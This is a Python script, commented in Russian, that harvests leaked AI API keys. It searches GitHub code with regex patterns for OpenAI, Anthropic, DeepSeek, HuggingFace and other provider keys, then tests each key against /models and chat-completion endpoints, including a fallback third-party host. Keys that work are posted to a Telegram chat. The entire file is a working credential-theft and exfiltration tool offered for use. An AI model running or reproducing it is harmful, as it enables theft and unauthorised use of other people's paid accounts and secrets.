import os
import re
import sys
import time
import requests
import logging
import asyncio

from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

logging.basicConfig(format="%(asctime)s - %(message)s", level=logging.INFO, stream=sys.stdout)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

# Паттерны ключей
KEY_PATTERNS = [
    {"provider": "openai",      "regex": re.compile(r"\bsk-proj-[A-Za-z0-9_-]{20,}\b")},
    {"provider": "anthropic",   "regex": re.compile(r"\bsk-ant-(?:api\d{2}-)?[A-Za-z0-9_-]{20,}\b")},
    {"provider": "kimi",        "regex": re.compile(r"\bsk-kimi-[A-Za-z0-9_-]{20,}\b")},
    {"provider": "minimax",     "regex": re.compile(r"\bsk-cp-[A-Za-z0-9_-]{20,}\b")},
    {"provider": "qwen",        "regex": re.compile(r"\bsk-sp-[A-Za-z0-9_-]{20,}\b")},
    {"provider": "deepseek",    "regex": re.compile(r"\bsk-[a-f0-9]{32}\b")},
    {"provider": "zhipu",       "regex": re.compile(r"\b[a-f0-9]{32}\.[A-Za-z0-9]{16}\b")},
    {"provider": "huggingface", "regex": re.compile(r"\bhf_[A-Za-z]{34}\b")},
    {"provider": "generic-sk",  "regex": re.compile(r"\bsk-(?=[A-Za-z0-9_-]*\d)(?=[A-Za-z0-9_-]*[A-Z])(?=[A-Za-z0-9_-]*[a-z])[A-Za-z0-9_-]{32,}\b")},
]

# Паттерн для поиска URL эндпоинтов (ищем ссылки, заканчивающиеся на /v1 или содержащие api)
URL_REGEX = re.compile(r'https?://[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}(?:/[a-zA-Z0-9._-]*)*(?:/v1)?')

def identify_key(token):
    for p in KEY_PATTERNS:
        if p["regex"].fullmatch(token):
            return p["provider"]
    return None

def fetch_targets():
    logger.info("🔎 Начинаю поиск ключей и эндпоинтов на GitHub...")
    headers = {"Authorization": f"Bearer {GITHUB_TOKEN}", "Accept": "application/vnd.github+json"}
    query = "sk- OR hf_ language:Python OR language:JavaScript"
    
    try:
        resp = requests.get("https://api.github.com/search/code", headers=headers, params={"q": query, "per_page": 30}, timeout=15)
        if resp.status_code == 403:
            logger.error("❌ ОШИБКА 403: Токен не подходит. Нужен Classic Token с public_repo!")
            return []
        resp.raise_for_status()
        
        items = resp.json().get("items", [])
        logger.info(f"✅ Найдено файлов: {len(items)}")
        
        targets = []
        for item in items[:20]:
            repo = item["repository"]["full_name"]
            path = item["path"]
            file_resp = requests.get(f"https://api.github.com/repos/{repo}/contents/{path}", headers={"Authorization": f"Bearer {GITHUB_TOKEN}", "Accept": "application/vnd.github.raw+json"}, timeout=10)
            
            if file_resp.status_code == 200:
                text = file_resp.text
                
                # 1. Ищем URL (эндпоинты) в файле
                urls = URL_REGEX.findall(text)
                # Очищаем от мусора (гитхаб, документация и т.д.)
                valid_urls = [u for u in urls if 'github.com' not in u and 'telegram' not in u and 'w3.org' not in u]
                # Ищем именно API-эндпоинты (обычно заканчиваются на /v1)
                api_urls = [u for u in valid_urls if u.endswith('/v1') or '/v1/' in u]
                
                if not api_urls and valid_urls:
                    api_urls = valid_urls[:1] # Если нет /v1, берем первый попавшийся URL

                # 2. Ищем ключи
                for p in KEY_PATTERNS:
                    for match in p["regex"].finditer(text):
                        token = match.group(0)
                        # Если в файле есть URL, привязываем ключ к нему
                        if api_urls:
                            for url in api_urls[:3]: # Максимум 3 урла на файл
                                targets.append({"key": token, "endpoint": url.rstrip('/'), "provider": p["provider"]})
                        else:
                            # Если URL нет, пробуем дефолтный
                            targets.append({"key": token, "endpoint": "https://chat.kxsb.org/api/v1", "provider": p["provider"]})
            time.sleep(1)
            
        # Убираем дубликаты
        unique_targets = []
        seen = set()
        for t in targets:
            sig = f"{t['key']}_{t['endpoint']}"
            if sig not in seen:
                seen.add(sig)
                unique_targets.append(t)
                
        logger.info(f"🔑 Извлечено уникальных пар (ключ+эндпоинт): {len(unique_targets)}")
        return unique_targets
    except Exception as e:
        logger.error(f"❌ Ошибка поиска: {e}")
        return []

def check_endpoint(api_key, endpoint):
    """Проверяет каталог /models на указанном эндпоинте"""
    try:
        resp = requests.get(f"{endpoint}/models", headers={"Authorization": f"Bearer {api_key}"}, timeout=10)
        if resp.status_code == 200:
            return [m.get("id", "") for m in resp.json().get("data", [])]
    except:
        pass
    return []

def probe_models(api_key, endpoint, models):
    """Тестирует модели на указанном эндпоинте"""
    results = []
    for model in models[:7]:
        payload = {"model": model, "messages": [{"role": "user", "content": "pong"}], "max_tokens": 5}
        start = time.perf_counter()
        try:
            resp = requests.post(f"{endpoint}/chat/completions", headers={"Authorization": f"Bearer {api_key}", "Content-Type": "application/json"}, json=payload, timeout=15)
            latency = round(time.perf_counter() - start, 2)
            ok = resp.status_code == 200
            msg = resp.text[:80].replace("\n", " ").strip() if not ok else "OK"
        except Exception as e:
            ok, latency, msg = False, "?", str(e)
        results.append({"model": model, "ok": ok, "status": getattr(resp, 'status_code', 'ERR'), "latency": latency, "msg": msg})
    return results

def format_report(key, endpoint, models, probes):
    working = [p for p in probes if p["ok"]]
    if not working:
        return None # Не отправляем, если ни одна модель не работает
        
    lines = [
        "🔑 Новый ключ",
        "",
        f"🌐 API — {endpoint}",
        f"🗝 Ключ — {key}",
        "✅ Работают —"
    ]
    
    for p in working:
        # Пример: gpt-4o-mini — 1.6s, 5 tok/s (pong)
        lines.append(f"{p['model']} — {p['latency']}s (pong)")
        
    lines.append(f"📦 Все модели — " + ", ".join(models[:5]))
    if len(models) > 5:
        lines.append(f"и ещё {len(models) - 5} за кадром")
        
    return "\n".join(lines)

async def run_scan():
    targets = fetch_targets()
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    if not targets:
        logger.info("🤷 Ключей не найдено. Завершаю.")
        return

    working_count = 0
    
    for t in targets:
        key, endpoint, provider = t["key"], t["endpoint"], t["provider"]
        logger.info(f"Проверяю {key[:10]}... на {endpoint}")
        
        models = check_endpoint(key, endpoint)
        if not models:
            logger.info("   └ Мертвый (нет доступа к /models)")
            continue
            
        logger.info(f"   └ Доступно моделей: {len(models)}. Делаю пробы...")
        probes = probe_models(key, endpoint, models)
        
        report = format_report(key, endpoint, models, probes)
        if report:
            working_count += 1
            if CHAT_ID:
                await app.bot.send_message(chat_id=CHAT_ID, text=report, parse_mode="Markdown")
            logger.info("   └ 🏆 ОТПРАВЛЕН РАБОЧИЙ КЛЮЧ!")
        else:
            logger.info("   └ Мертвый (все пробы 401/403)")

    logger.info(f"✅ Сессия завершена. Отправлено рабочих ключей: {working_count}.")

async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Бот работает. Ищу ключи в фоне.")

if __name__ == "__main__":
    if not BOT_TOKEN or not GITHUB_TOKEN:
        logger.error("Нет токенов в переменных окружения!")
        sys.exit(1)
    
    asyncio.run(run_scan())
